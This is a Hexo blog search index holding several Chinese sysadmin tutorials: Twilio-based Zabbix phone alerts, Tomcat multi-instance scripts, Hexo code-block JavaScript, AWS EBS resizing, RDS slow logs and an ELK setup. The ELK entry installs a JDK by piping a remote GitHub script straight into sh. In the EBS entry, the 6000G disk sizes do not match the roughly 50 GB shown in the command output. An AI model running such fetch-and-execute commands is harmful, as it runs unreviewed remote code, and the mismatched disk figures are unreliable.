<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Zabbix电话报警]]></title>
    <url>%2F2018%2F07%2F06%2Fzabbix-alarm-phone%2F</url>
    <content type="text"><![CDATA[Zabbix 使用 twilio 进行免费电话报警, 免除企业认证繁琐步骤 0x00 注册 twilio 获取 api 调用key1. 注册账号 注册地址 Twilio-SignUp 需要翻墙 密码至少14个字符，不需要特殊字符 通过后 选择中国区, 验证手机号 创建项目名称(随便写) 2. 获取网络号码 初始配置地址 选择如下选项: 记住这个号码结果+18652052853后期会使用 到此就不用继续走剩下的几步了 其他自定义电话设置(默认不需要配置) 0x01 编辑zabbix调用API脚本 获取API_Key地址 Dashboard &gt;&gt; Settings &gt;&gt; General 获取ACCOUNT SID, AUTH TOKEN 注意: 试用账号只能打给 注册时使用的手机号!! 更改文件属主及权限chown zabbix:zabbix &amp;&amp; chmod +x zabbix_phone.py zabbix/alertscripts/zabbix_phone.py12345678910111213141516171819# -*- coding: utf-8 -*-#!/usr/bin/env pythonfrom twilio.rest import Client# Your Account Sid and Auth Token from twilio.com/consoleaccount_sid = 'your_sid'auth_token = 'your_token'client = Client(account_sid, auth_token)call = client.calls.create( url='https://demo.twilio.com/welcome/voice/', #注册使用的手机号 to='+8611111', #上面获取到的网络电话号码 from_='+19387770820' )print(call.sid) 执行文件测试, 返回一段id表示成功, 接到电话 0x02 配置zabbix1. 添加报警媒介 2. 连接到用户 3. 添加到动作 至此zabbix电话报警配置完成, 如果需要免费打给多个用户, 可以注册多个账号,添加多个媒介 然后 绑定到同一个动作中.]]></content>
      <categories>
        <category>自动化运维</category>
        <category>Zabbix</category>
      </categories>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Tomcat单机多实例部署及管理]]></title>
    <url>%2F2018%2F06%2F28%2Ftomcat-multiple%2F</url>
    <content type="text"><![CDATA[单台机器部署多个 Tomcat, 每个Tomcat部署独立服务,Tomcat之间启停互不影响 不要问我为什么有这个需求, 复制粘贴就是干 0x00 单机多实例概述 大概的目录结构: CATALINA_HOME 为Tomcat应用程序运行程序及所需依赖 CATALINA_BASE 即我们即将部署的程序 手动更改如下工作目录: 这是我自己个儿整的初始目录结构 download12345678910war_apps #手动创建用来存放下载好的war包文件tomcat #CATALINA_HOME├── bin├── INIT_APPS_FILE #CATALINA_BASE│ ├── conf│ ├── logs│ ├── temp│ ├── webapps│ └── work└── lib 然后呢正常的思路就是配置每个APP的server.xml端口: 1234- Server Port：该端口用于监听关闭tomcat的shutdown命令，默认为8005- Connector Port：该端口用于监听HTTP的请求，默认为8080- AJP Port：该端口用于监听AJP（ Apache JServ Protocol ）协议上的请求，通常用于整合Apache Server等其他HTTP服务器，默认为8009- Redirect Port：重定向端口，出现在Connector配置中，如果该Connector仅支持非SSL的普通http请求，那么该端口会把 https 的请求转发到这个Redirect Port指定的端口，默认为8443； 应用太多你难道要一个个手动改? no no no! 上脚本 0x01 自动部署管理配置需要把应用war包传到可下载位置,来用于应用分发,我这里是直接传到了阿里云的oss桶里 1.添加tomcat更新启停控制脚本需要安装unzip yum -y install unzip manage.sh需要放在这里,也可以自定义改代码1234567891011war_apps #手动创建用来存放下载好的war包文件tomcat #CATALINA_HOME├── bin├── manage.sh├── INIT_APPS_FILE #CATALINA_BASE│ ├── conf│ ├── logs│ ├── temp│ ├── webapps│ └── work└── lib 蓝色块需要根据实际情况自定义, 应用名称, 和war包下载地址不需要写,后面的python总控制台会自动分配 manage.sh123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#!/bin/sh# Author: Kionf# description: 启动tomcat多实例.# PATH=/opt/op/java/jdk1.8.0_172/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin# 应用名称app=# war包下载地址war_url=soft_dir="/opt/op"download_war_file="$&#123;soft_dir&#125;/war_apps/$&#123;app&#125;.war"export CATALINA_BASE="$&#123;soft_dir&#125;/tomcat/$app"export CATALINA_HOME="$&#123;soft_dir&#125;/tomcat"export JVM_OPTIONS="-Xms528m -Xmx812m -Xmn328m"check()&#123; PID=`ps aux|grep java|grep -w $&#123;CATALINA_BASE&#125;|awk '&#123;print $2&#125;'` if [ -n "$PID" ];then echo -e "\033[94m $app is running PID:$PID" running=`netstat -ntlp|grep $PID|grep 127.0.0.1` if [ -n "$running" ];then echo -e "\033[92m $app is provide services\033[0m " else echo -e "\033[93m $app is running but not provide services\033[0m" fi return 0 else echo -e "\033[91m $app is dead\033[0m " return 1 fi&#125;start() &#123; check if [ $? -eq 1 ];then echo -e "\033[94m Start $app \033[0m" $CATALINA_HOME/bin/startup.sh &gt;/dev/null 2&gt;&amp;1 fi&#125;stop() &#123; check if [ $? -eq 0 ];then echo -e "\033[94m Stop $app\033[0m" $CATALINA_HOME/bin/shutdown.sh &gt;/dev/null 2&gt;&amp;1 kill -9 $PID fi&#125;update() &#123; echo "下载文件" wget $&#123;war_url&#125; -O $&#123;download_war_file&#125; &gt; /dev/null 2&gt;&amp;1 if [ $? -eq 0 ];then cd $&#123;CATALINA_BASE&#125;/webapps/*/; unzip -q -o $&#123;download_war_file&#125; &gt;/dev/null 2&gt;&amp;1 fi&#125;log() &#123; tailf $&#123;CATALINA_BASE&#125;/logs/catalina.out&#125;if [ $# != "0" ];then case "$1" in start) start ;; stop) stop ;; restart) stop start ;; status) check ;; upgrade) stop update start ;; log) log ;; *) echo $"Usage: $0 &#123;start|stop|restart|status|upgrade|log&#125;" exit 1 ;; esacelse start logfi 2.添加总控制台脚本 我就放在了/usr/local/bin下, chmod +x /usr/local/bin/tomcat_manager 蓝色部分需要根据自己需求更改 (支持python2) /usr/local/bin/tomcat_manager123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207#! /usr/bin/env python# -*- coding: utf-8 -*-# @Time : 2018/5/23 15:18# @Author : Kionf# @FileName: tomcat_manager.py## 初始配置并管理单例tomcat多应用#import osimport subprocessimport sysimport shutil# PATH = os.getcwd()PATH = "/opt/op/tomcat" #Tomcat目录shell_script = os.path.join(PATH, "manage.sh") #更新启停管理脚本INIT_FILES = os.path.join(PATH, "INIT_APPS_FILE")bucket = "https://oss.aliyuncs.com/tomcat_app/" # webapp下载地址config_data = &#123; # 应用名: [ServerPort, ConnectPort, AJPPort, RedirectPort, ] 'Application': ['8201', '8101', '8301', '8401', 'BaseApplication.war'], 'BaseNotify_Service': ['8202', '8102', '8302', '8402', 'BaseNotify_Service.war'], 'BaseUserCenter_Service': ['8203', '8103', '8303', '8403', 'BaseUserCenter_Service.war'],&#125;def customize_print(msg, stat=0): if stat == 1: print("\033[91m [ERROR]: %s \033[0m" % msg) elif stat == 0: print("\033[92m [INFO]: %s \033[0m" % msg) elif stat == 2: print("\033[93m [DEBUG]: %s \033[0m" % msg)class TomcatAppsManage: def __init__(self, webapp): self.name = webapp self.app_config = config_data[self.name] self.manage_shell_file = os.path.join(PATH, self.name, self.name) self.server_port, self.conn_port, self.ajp_port, self.redirect_port, self.app_war_name = self.app_config self.app_download_url = bucket + self.app_war_name self.config_file = os.path.join(PATH, self.name, 'conf/server.xml') self.webapp_dir = os.path.join(PATH, self.name) def create_app(self): """ 创建app :return: """ if not os.path.exists(self.webapp_dir): customize_print("创建APP: %s" % self.name) shutil.copytree(INIT_FILES, self.webapp_dir) os.mkdir(os.path.join(self.webapp_dir, "webapps", self.name.lower())) def config_app_port(self): customize_print("正在修改APP：%s 配置" % self.name) change_port = &#123; 'ServerPort': "sed -i s'#Server port=\"[0-9]*\"#Server port=\"" + self.server_port + "\"#'g " + self.config_file, 'ConnPort': "sed -i s'#Connector port=\"[0-9]*\" protocol=\"HTTP/1.1\"#Connector port=\"" + self.conn_port + "\" protocol=\"HTTP/1.1\"#'g " + self.config_file, 'RedirectPort': "sed -i s'#redirectPort=\"[0-9]*\"#redirectPort=\"" + self.redirect_port + "\"#'g " + self.config_file, 'AjpPort': "sed -i s'#Connector port=\"[0-9]*\" protocol=\"AJP/1.3\"#Connector port=\"" + self.ajp_port + "\" protocol=\"AJP/1.3\"#'g " + self.config_file, &#125; for port in change_port.keys(): # customize_print("修改 %s 端口" % port) os.system(change_port[port]) def config_app_manage_shell(self): customize_print("%s 添加管理脚本" % self.name) copy_shell_script = 'cp -f ' + shell_script + ' ' + self.manage_shell_file os.system(copy_shell_script) config_script_app_name = "sed -i 's/app=/app=\"" + self.name + "\"/' " + self.manage_shell_file os.system(config_script_app_name) config_script_war_url = "sed -i 's#war_url=#war_url=\"" + self.app_download_url + "\"#' " + self.manage_shell_file os.system(config_script_war_url) def status_app(self): """ :return: 0提供服务，1停止，2未提供服务 """ try: result = subprocess.check_output(['sh', self.manage_shell_file, 'status']) except subprocess.CalledProcessError as e: result = e.output if 'run' in result: if 'is provide services' in result: customize_print("应用 %s 成功启动并提供服务" % self.name) return 0 elif 'but' in result: customize_print("应用 %s 进程存在但未提供服务" % self.name, 2) return 2 else: customize_print("应用 %s 以停止" % self.name, 1) return 1 def manage(self, operate): os.system('sh %s %s' % (self.manage_shell_file, operate)) def init(self): self.create_app() self.config_app_port() self.config_app_manage_shell() self.manage("upgrade") self.manage("stop") def restart(self): self.manage("stop") self.manage("start") def start(self): self.manage("start") def stop(self): self.manage("stop") def log(self): self.manage("log") def upgrade(self): self.lock_config_file() self.manage("upgrade") def lock_config_file(self): cmd = 'find ' + self.webapp_dir + ' -name db*properties -o -name config_base_*|xargs chattr +i &gt;/dev/null 2&gt;&amp;1' customize_print("锁配置文件", 2) os.system(cmd) def unlock_config_file(self): cmd = 'find ' + self.webapp_dir + ' -name db*properties -o -name config_base_*|xargs chattr -i &gt;/dev/null 2&gt;&amp;1' customize_print("解锁配置文件", 2) os.system(cmd)def dash_board(apps, operate): """ 主管理程序，调用 :param operate: 应用操作 :param apps: apps 为list """ for app in apps: app_obj = TomcatAppsManage(app) main_dict = &#123; "init": app_obj.init, "shell": app_obj.config_app_manage_shell, "status": app_obj.status_app, "start": app_obj.start, "stop": app_obj.stop, "restart": app_obj.restart, "upgrade": app_obj.upgrade, "log": app_obj.log, "lock": app_obj.lock_config_file, "unlock": app_obj.unlock_config_file, &#125; try: main_dict[operate]() except KeyError as e: customize_print(help_msg)help_msg = """使用方法： 1 log all status 管理应用编号 操作操作： lock 锁配置文件 unlock 解锁配置文件 init 配置tomcat监听端口 shell 配置webapp控制脚本 status，start，restart, log，upgrade，stop 应用操作"""def main(): app_list = [] for index, app_name in enumerate(config_data, 1): print "\033[94m %s: %s \033[0m" % (index, app_name) app_list.append(app_name) choice = raw_input("输入要管理的服务: ") try: app_index = choice.split()[0] operate = choice.split()[1] if app_index.isdigit(): app_index = int(app_index) if len(app_list) &gt;= app_index &gt; 0: app_name = app_list[app_index - 1] dash_board(app_name.split(), operate) elif app_index == "all": dash_board(app_list, operate) except ValueError and IndexError: customize_print("参数输入错误", 1) customize_print(help_msg)if __name__ == '__main__': try: dash_board(sys.argv[1].split(), sys.argv[2]) except IndexError: try: while True: main() except KeyboardInterrupt: customize_print("Bye!") 0x02 开始初始化部署执行tomcat_manager all init 自动初始化部署所有项目, 其他具体使用方法见帮助信息]]></content>
      <categories>
        <category>Linux</category>
        <category>Tomcat</category>
      </categories>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo next代码片段添加代码块复制和长代码自动展开]]></title>
    <url>%2F2018%2F06%2F28%2Fblog-next%2F</url>
    <content type="text"><![CDATA[添加鼠标移动到长代码块, 自动展开. 代码块复制按钮及定制 0x00 添加第三方js插件clipboard.js 下载 ./themes/next/source/lib/zclip/clipboard.min.js 新增 0x01 插入自定义javascript新增custom.js文件, 目录如下 ./themes/next/source/js/src/custom.js 新增 ./themes/next/source/js/src/custom.js123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246var browserHeight = document.documentElement.clientHeight || document.body.clientHeight;var scrollTop = document.documentElement.scrollTop || document.body.scrollTop;function createCopyBtns() &#123; // 创建复制button 对象 var $figure = $("figure .figcode"); if ($figure.length &gt; 0) &#123; $(".post-body").before('&lt;div id="copyBtn" &gt;&lt;span id="imgCopy" &gt;&lt;i class="fa fa-paste fa-fw"&gt;&lt;/i&gt;&lt;/span&gt;&lt;span id="imgSuccess" style="display: none;color: #6FB76F;"&gt;&lt;i class="fa fa-check-circle fa-fw" aria-hidden="true"&gt;&lt;/i&gt;&lt;/span&gt;'); $figure.append('&lt;div class="codePinBtn"&gt;&lt;img id="imgSuccess" src="/article_images/png/Pin_green.png" style="border:none; width: 24px;"&gt;&lt;/div&gt;'); &#125; var $codeArea = $("figure .code"); if ($codeArea.length &gt; 0) &#123; function changeToSuccess(item) &#123; $imgOK = $("#copyBtn").find("#imgSuccess"); if ($imgOK.css("display") == "none") &#123; $imgOK.css(&#123; opacity: 0, display: "block" &#125;); $imgOK.animate(&#123; opacity: 1 &#125;, 1000); setTimeout(function () &#123; $imgOK.animate(&#123; opacity: 0 &#125;, 2000); &#125;, 2000); setTimeout(function () &#123; $imgOK.css("display", "none"); &#125;, 4000); &#125; ; &#125;; var clipboard = new ClipboardJS('#copyBtn', &#123; // 定制筛选复制 target: function () &#123; var node = document.querySelector("[copyFlag]"); var child = node.querySelector(".diff-deletion"); if (child != null) &#123; var pre = node.querySelector("pre").cloneNode(true); child = pre.querySelector(".diff-deletion"); while (child != null) &#123; pre.removeChild(child) child = pre.querySelector(".diff-deletion"); &#125; var node = document.getElementById('tmpcopy'); if (node == null) &#123; node = document.createElement('div'); node.id = 'tmpcopy'; node.style.position = 'fixed'; node.style.width = '0'; node.style.height = '0'; document.body.appendChild(node); &#125; node.innerHTML = ''; node.appendChild(pre); &#125; return node; &#125;, isSupported: function () &#123; alert(this.support); return document.querySelector("[copyFlag]"); &#125; &#125;); clipboard.on('success', function (e) &#123; e.clearSelection(); changeToSuccess(e); var node = document.getElementById("tmpcopy"); if (node != null) node.innerHTML = ''; &#125;); clipboard.on('error', function (e) &#123; console.error('Action:', e.action); console.error('Trigger:', e.trigger); &#125;); $("#copyBtn").hover( function () &#123; $(this).stop(); $(this).css("opacity", 1); &#125;, function () &#123; $(this).animate(&#123; opacity: 0 &#125;, 2000); &#125; ); &#125;&#125;function FigureHover(figure) &#123; // 移动鼠标拉伸显示代码 var block = $(figure).attr("block"); if (block != 1) &#123; var codeArea = $(figure).find(".code")[0]; var width_code = codeArea.clientWidth; var width_Scroll = codeArea.scrollWidth; var width_Margin = -parseInt($(figure).css("marginRight")); $codePinBtn = $(figure).find(".codePinBtn"); var width_Hide = width_Scroll - (width_code - width_Margin); if (width_Hide &gt; 0) &#123; $(figure).stop(); $codePinBtn.stop(); var width_Main = $("#main").width(); var width_Base = $(".main-inner").width(); var width_Blank = (width_Main - width_Base) / 2 - 10; if (width_Blank &gt; 0) &#123; if (width_Hide &lt; width_Blank) &#123; width_Margin = width_Hide; //空白区域足够直接显示 全部 &#125; else &#123; width_Margin = width_Blank * 0.8; &#125; $(figure).animate(&#123;marginRight: -width_Margin&#125;); $codePinBtn.animate(&#123;opacity: 1&#125;); &#125; &#125; ; &#125; ;&#125;;function FigureHoverOut(figure) &#123; // 鼠标移除代码块 $("#copyBtn").animate(&#123; opacity: 0 &#125;, 2000); var block = $(figure).attr("block"); if (block != 1) &#123; $(figure).stop(); $(figure).animate(&#123;marginRight: "0"&#125;); var $codePinBtn = $(figure).find(".codePinBtn"); $codePinBtn.stop(); $codePinBtn.css(&#123;opacity: 0&#125;); &#125;&#125;;$("figure").hover( // 鼠标移入代码块 function () &#123; FigureHover(this); var block = $(this).attr("block"); //-------鼠标活动在代码块内 //移除之前含有复制标志代码块的 copyFlag $("[copyFlag]").removeAttr("copyFlag"); //在新的（当前鼠标所在代码区）代码块插入标志：copyFlag $(this).find(".code").attr("copyFlag", 1); //获取复制按钮 $copyBtn = $("#copyBtn"); if ($copyBtn.lenght != 0) &#123; //获取到按钮的前提下进行一下操作 //停止按钮动画效果 //设置为 显示状态 //修改 复制按钮 位置到 当前代码块开始部位 //设置代码块 左侧位置 $copyBtn.stop(); $copyBtn.css("opacity", 0.8); $copyBtn.css("display", "block"); $copyBtn.css("top", parseInt($copyBtn.css("top")) + $(this).offset().top - $copyBtn.offset().top + 3); $copyBtn.css("left", -$copyBtn.width() - 3); &#125; &#125;, function () &#123; FigureHoverOut(this); &#125;,);function btnPinClick() &#123; var figure = this.parentElement.parentElement; var block = $(figure).attr("block"); if (block != 1) &#123; $(".post-body").css("transform", "none"); $(figure).attr("block", 1); $(this).find("img").attr("src", "/article_images/png/Pin_red.png"); &#125; else &#123; $(figure).attr("block", 0); $(this).find("img").attr("src", "/article_images/png/Pin_green.png"); &#125;&#125;$("figure").unbind("dblclick").bind("dblclick", function () &#123; //双击事件 var block = $(this).attr("block"); if (block != 1) &#123; $(".post-body").css("transform", "none"); $(this).attr("block", 1); $(this).find(".codePinBtn img").attr("src", "/article_images/png/Pin_red.png"); &#125; else &#123; $(this).attr("block", 0); $(this).find(".codePinBtn img").attr("src", "/article_images/png/Pin_green.png"); &#125;&#125;)$(window).resize(function () &#123; var block; var width_Main = $("#main").width(); var width_Base = $(".main-inner").width(); var width_Blank = (width_Main - width_Base) / 2 - 10; $copyBtn = $("#copyBtn"); if (width_Blank &lt; $copyBtn.width()) &#123; $copyBtn.css("display", "none"); &#125; else &#123; $copyBtn.css("display", "block"); &#125; $("figure[block='1']").each(function () &#123; block = $(this).attr("block"); if (block == 1) &#123; var width_This = $(this).width(); var width_Scroll = $(this)[0].scrollWidth; var width_Margin = -parseInt($(this).css("marginRight")); var width_Hide = width_Scroll - (width_This - width_Margin); if (width_Hide &gt; 0) &#123; //var width_Main = $("#main").width(); //var width_Base = $(".main-inner").width(); //width_Blank = (width_Main - width_Base) / 2 - 10; if (width_Blank &gt; 0) &#123; if (width_Hide &lt; width_Blank) &#123; width_Margin = width_Hide; //空白区域足够直接显示 全部 &#125; else &#123; width_Margin = width_Blank * 0.8; &#125; $(this).css(&#123; marginRight: -width_Margin &#125;); $(this).find(".codePinBtn").animate(&#123; opacity: 1, left: $(".post-body")[0].getBoundingClientRect().right + width_Margin - $(this).find(".codePinBtn").width() &#125;); &#125; &#125; &#125; &#125;);&#125;);$(document).ready(function () &#123; createCopyBtns(); $(".codePinBtn").unbind("click").bind("click", btnPinClick);&#125;); 0x02 添加自动改变代码片段js ./themes/next/source/js/src/function.js 新增 ./themes/next/source/js/src/function.js1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980function getClass(tagName, className) //获得标签名为tagName,类名className的元素&#123; if (document.getElementsByClassName) //支持这个函数 &#123; return document.getElementsByClassName(className); &#125; else &#123; var tags = document.getElementsByTagName(tagName); //获取标签 var tagArr = []; //用于返回类名为className的元素 for (var i = 0; i &lt; tags.length; i++) &#123; if (tags[i].class == className) &#123; tagArr[tagArr.length] = tags[i]; //保存满足条件的元素 &#125; &#125; return tagArr; &#125;&#125;function addEvent(obj, type, fn) &#123; if (obj.addEventListener) obj.addEventListener(type, fn, false); else if (obj.attachEvent) obj.attachEvent('on' + type, fn); else obj['on' + type] = fn;&#125;function removeEvent(obj, type, fn) &#123; if (obj.removeEventListener) obj.removeEventListener(type, fn, false); else if (obj.detachEvent) obj.detachEvent('on' + type, fn); else obj['on' + type] = null;&#125;;function resizePos(obj, callback) &#123; if (typeof callback == "function") &#123; addEvent(window, 'scroll', function() &#123; callback(obj); &#125;); addEvent(window, 'resize', function() &#123; callback(obj); &#125;); &#125;&#125;function getBrowser(getVersion) &#123; //注意关键字大小写 var ua_str = navigator.userAgent.toLowerCase(), ie_Tridents, trident, match_str, ie_aer_rv, browser_chi_Type; //判断IE 浏览器, //blog: http://blog.csdn.Net/aerchi/article/details/51697592 if ("ActiveXObject" in self) &#123; // ie_aer_rv: 指示IE 的版本. // It can be affected by the current document mode of IE. ie_aer_rv = (match_str = ua_str.match(/msie ([\d.]+)/)) ? match_str[1] : (match_str = ua_str.match(/rv:([\d.]+)/)) ? match_str[1] : 0; // ie: Indicate the really version of current IE browser. ie_Tridents = &#123; "trident/7.0": 11, "trident/6.0": 10, "trident/5.0": 9, "trident/4.0": 8 &#125;; //匹配 ie8, ie11, edge trident = (match_str = ua_str.match(/(trident\/[\d.]+|edge\/[\d.]+)/)) ? match_str[1] : undefined; browser_chi_Type = (ie_Tridents[trident] || ie_aer_rv) &gt; 0 ? "internet-explorer" : undefined; &#125; else &#123; //判断 windows edge 浏览器 // match_str[1]: 返回浏览器及版本号,如: "edge/13.10586" // match_str[1]: 返回版本号,如: "edge" //若要返回 "edge" 请把下行的 "ie" 换成 "edge"。 注意引号及冒号是英文状态下输入的 browser_chi_Type = (match_str = ua_str.match(/edge\/([\d.]+)/)) ? "edge" : //判断firefox 浏览器 (match_str = ua_str.match(/firefox\/([\d.]+)/)) ? "firefox" : //判断chrome 浏览器 (match_str = ua_str.match(/chrome\/([\d.]+)/)) ? "chrome" : //判断opera 浏览器 (match_str = ua_str.match(/opera.([\d.]+)/)) ? "opera" : //判断safari 浏览器 (match_str = ua_str.match(/version\/([\d.]+).*safari/)) ? "safari" : undefined; &#125; //返回浏览器类型和版本号 var verNum, verStr; verNum = trident &amp;&amp; ie_Tridents[trident] ? ie_Tridents[trident] : match_str[1]; verStr = (getVersion != undefined) ? browser_chi_Type + "/" + verNum : browser_chi_Type; return verStr;&#125; 0x03 插入到主题新建文件 custom.swig ，目录如下：（相对目录为工程目录） ./themes/next/layout_custom/custom.swig 新增 123&lt;script type="text/javascript" src="/js/src/function.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="/lib/zclip/clipboard.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="/js/src/custom.js"&gt;&lt;/script&gt; 修改文件 _layout.swig ，目录如下：（相对目录为工程目录） ./themes/next/layout/_layout.swig 修改 ./themes/next/layout/_layout.swig&lt;!doctype html&gt;...&lt;html class="&#123;&#123; html_class | lower &#125;&#125;" lang="&#123;&#123; config.language &#125;&#125;"&gt;&lt;head&gt;...&lt;/head&gt;&lt;body itemscope itemtype="http://schema.org/WebPage" lang="&#123;&#123; page.lang || page.language || config.language &#125;&#125;"&gt; ... ... &#123;% include '_third-party/mathjax.swig' %&#125; &#123;% include '_third-party/scroll-cookie.swig' %&#125; &#123;% include '_third-party/exturl.swig' %&#125; &#123;% include '_custom/custom.swig' %&#125;&lt;/body&gt;&lt;/html&gt; 0x04 更改button ./themes/next/source/css/_custom/button.styl 新增 1234567891011121314151617.codePinBtn&#123; flex: 0 0 auto; opacity: 0; z-index: 1000; margin-left: -23px; align-self: start;&#125;#copyBtn &#123; opacity: 0; position: fixed; display: block; z-index: 1000; line-height: 1; font-size: 1.5em; left: 18px;&#125; ./themes/next/source/css/_custom/custom.styl 修改 ...@import button; 添加代码拉伸控制button文件 剩下的自己鼓捣 神器]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>blog</tag>
        <tag>next</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AWS EC2 磁盘EBS扩容]]></title>
    <url>%2F2017%2F11%2F15%2Flinux-aws-ebs%2F</url>
    <content type="text"><![CDATA[5min不停机扩容EBS卷大小 0x00 增加磁盘大小1. 在ec2实例界面选择相应需要扩容磁盘的实例，选择要扩容的磁盘 2. 修改卷大小 3. 确认显示进度，等待应用配置完成，需要几分钟耐心等待…. 0x01 扩容磁盘安装扩容工具 1yum install cloud-init cloud-utils-growpart gdisk 等待ebs卷大小调整完成后，在扩容的实例中执行lsblk列出连接到实例的EBS设备 1234[root@ttt] #: lsblkNAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTxvda 202:0 0 6000G 0 disk └─xvda1 202:1 0 20G 0 part / 使用 df -h 查看，/dev/xvda1 设备已扩展为 6000 GiB，但操作系统仍只能看到原来的 20 GiB ext4 文件系统 12345[root@ttt] #: df -h文件系统 容量 已用 可用 已用% 挂载点devtmpfs 3.9G 64K 3.9G 1% /devtmpfs 3.9G 0 3.9G 0% /dev/shm/dev/xvda1 20G 12G 8.2G 59% / 接下来使用growpart展开修改后的分区（注意将设备名称与分区名称分隔开） 12[root@ttt] #: growpart /dev/xvda 1CHANGED: disk=/dev/xvda partition=1: start=4096 old: size=41938910,end=41943006 new: size=104853470,end=104857566 通过查看lsblk可以确认分区/dev/xvda1现已填充卷/dev/xvda上的可用空间： 1234[root@ttt] #: lsblkNAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTxvda 202:0 0 6000G 0 disk └─xvda1 202:1 0 6000G 0 part / 对于 Linux ext2、ext3 或 ext4 文件系统，使用以下命令并替换要扩展的设备名称： 12345[root@ttt] #: resize2fs /dev/xvda1resize2fs 1.42.12 (29-Aug-2014)Filesystem at /dev/xvda1 is mounted on /; on-line resizing requiredold_desc_blocks = 2, new_desc_blocks = 4The filesystem on /dev/xvda1 is now 13106683 (4k) blocks long. 0x02 完成扩容至此，磁盘已完成扩容，查看磁盘可用空间： 12345[root@ttt] #: df -h文件系统 容量 已用 可用 已用% 挂载点devtmpfs 3.9G 64K 3.9G 1% /devtmpfs 3.9G 0 3.9G 0% /dev/shm/dev/xvda1 6000G 12G 5988.2G 0.002% /]]></content>
      <categories>
        <category>自动化运维</category>
        <category>AWS</category>
      </categories>
      <tags>
        <tag>AWS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[aws上RDS数据库开启慢查询日志]]></title>
    <url>%2F2017%2F11%2F08%2Fmysql-slowlog%2F</url>
    <content type="text"><![CDATA[mysql数据库开启慢查询日志和查询中没索引的语句。供分析 0x00参数首先选择RDS服务&gt;参数组选择需要更改的参数组更改如下参数: 123456789101112- slow_query_log：要创建慢速查询日志，请设置为 1。默认值为 0。- general_log：要创建一般日志，请设置为 1。默认值为 0。- long_query_time：只记录查询时间超过制定时间的sql。例long_query_time=0.5只记录查询时间超过500毫秒的sql。- log_queries_not_using_indexes：要将所有不使用索引的查询记录到慢速查询日志，请设置为 1。默认值为 0。即使查询的执行时间小于 long_query_time 参数值，只要它们不使用索引，就会被系统记录。- log_output：您可为 log_output 参数指定下列选项之一。 TABLE (默认) – 将一般查询写入 mysql.general_log 表，将慢速查询写入 mysql.slow_log 表。 FILE (推荐) – 将一般查询日志和慢速查询日志写入文件系统。日志文件每小时轮换一次。 NONE– 禁用日志记录。 启用了日志记录时，Amazon RDS 会定期轮换表日志或删除日志文件，log_output为TABLE时如需手动轮换执行： 12PROMPT&gt; CALL mysql.rds_rotate_slow_log;PROMPT&gt; CALL mysql.rds_rotate_general_log; log_output为FILE时会每小时检查日志文件并删除 24 小时之前的日志文件。 0x01实际应用参数12345slow_query_log=1general_log=1long_query_time=0.5log_queries_not_using_indexes=1log_output=FILE]]></content>
      <categories>
        <category>数据库</category>
        <category>Mysql</category>
      </categories>
      <tags>
        <tag>AWS</tag>
        <tag>Mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[log4j-1.2 + ELK部署]]></title>
    <url>%2F2017%2F09%2F18%2Felk-deploy%2F</url>
    <content type="text"><![CDATA[log4j-1.2 + logstash-5.0.1 + elasticsearch-5.6.0 + kibana-5.6.0 0x00 下载ELK下载 ： 1) logstash-5.0.12) kibana-5.6.03) elasticsearch-5.6.04) 安装jdk1.8 curl https://raw.githubusercontent.com/kalivim/Linux_shell/master/jdk-1.8.112.sh|sh 下载完成后解压相应文件,脚本安装jdk在/data/software/下 123export JAVA_HOME=/data/jdk1.8.0_112export PATH=$JAVA_HOME/bin:$PATHexport CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar 0x01 配置log4j首先配置程序log4j配置文件log4j.properties,添加如下配置 1234567891011#在rootLogger中添加logstashlog4j.rootLogger=info,all,logstash#logstachlog4j.appender.logstash=org.apache.log4j.net.SocketAppender#logstash监听端口，默认4560log4j.appender.logstash.Port=4560#logstash主机ip/hostlog4j.appender.logstash.RemoteHost=opslog4j.appender.logstash.ReconnectionDelay=60000log4j.appender.logstash.LocationInfo=true 0x02 配置logstash编辑配置文件，log4j.cfg 12345678910111213141516171819202122232425262728293031323334353637vim logstash-5.0.1/log4j.cfg#内容input &#123; log4j &#123; host =&gt; "172.16.0.12" #监听地址 port =&gt; 4560 #监听端口 &#125;&#125;filter &#123; #过滤错误类型删除掉INFO类型错误 if [priority] == "INFO" &#123; drop &#123;&#125; &#125; #else if [method] == "checkSqlShardName" &#123; #drop &#123;&#125; #&#125;&#125;output &#123; #输出到控制台（调试） stdout &#123; codec =&gt; rubydebug &#125; elasticsearch &#123; hosts =&gt; ["127.0.0.1:9200"] #elasticsearch地址 index =&gt; "game-%&#123;+YYYY.MM.dd&#125;" #建立索引 flush_size =&gt; 1000 &#125;&#125; 注意这里有一个小bug,在input中使用log4j接收不到日志，使用tcp可以接收。这里需要改下logstash源码文件 vim logstash-core/lib/jars.rb 注释掉第二行#require_jar(&#39;org.apache.logging.log4j&#39;, &#39;log4j-1.2-api&#39;, &#39;2.6.2&#39;) 注 